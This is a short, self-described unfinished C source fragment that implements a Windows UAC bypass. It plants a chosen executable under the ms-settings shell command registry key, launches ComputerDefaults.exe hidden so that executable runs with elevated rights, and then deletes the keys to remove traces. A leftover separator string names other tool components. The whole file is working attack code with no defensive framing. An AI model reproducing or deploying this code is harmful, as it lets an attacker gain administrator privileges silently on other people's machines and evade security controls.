/*
UNFINISHED
*STILL WORKING ON IT
*/
int ComDefaults(char ExE[]){ // ComputerDefaults.exe
	HKEY Hkey;
	char path[]="Software\\Classes\\ms-settings\\shell\\open\\command";
	SHELLEXECUTEINFO ShExecInfo = {0};
	RegCreateKeyEx(
		HKEY_CURRENT_USER,path, 0,
		NULL,REG_OPTION_NON_VOLATILE,
		KEY_WRITE, NULL,&Hkey,NULL
	);
	if(RegSetValueEx(Hkey,"DelegateExecute",0,REG_SZ,(LPBYTE)"",0)!=ERROR_SUCCESS){
		return 1;
	}; // Adding a regkey
	if(RegSetValueEx(Hkey,NULL,0,REG_SZ,(LPBYTE) ExE,strlen(ExE))!=ERROR_SUCCESS){
		return 1;
	}; // Adding  the (Default) regkey
	RegCloseKey(Hkey); // Clsoe regkey
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;
	ShExecInfo.lpParameters = NULL;
	ShExecInfo.lpFile = "C:\\windows\\system32\\ComputerDefaults.exe";
	ShellExecuteEx(&ShExecInfo); // Execute
	WaitForSingleObject(ShExecInfo.hProcess,INFINITE);
	RegDeleteKeyA(HKEY_CURRENT_USER,"Software\\Classes\\ms-settings\\shell\\open\\command");Sleep(10);
	RegDeleteKeyA(HKEY_CURRENT_USER,"Software\\Classes\\ms-settings\\shell\\open");Sleep(10);
	RegDeleteKeyA(HKEY_CURRENT_USER,"Software\\Classes\\ms-settings\\shell");Sleep(10);
	RegDeleteKeyA(HKEY_CURRENT_USER,"Software\\Classes\\ms-settings");Sleep(10);
	return 0;
}

char SeperateChar[] = "RandomCharacterStringHereJustToSeperateIt"; // Tool32_1 and Tool32_2, S64_2 and S64_1
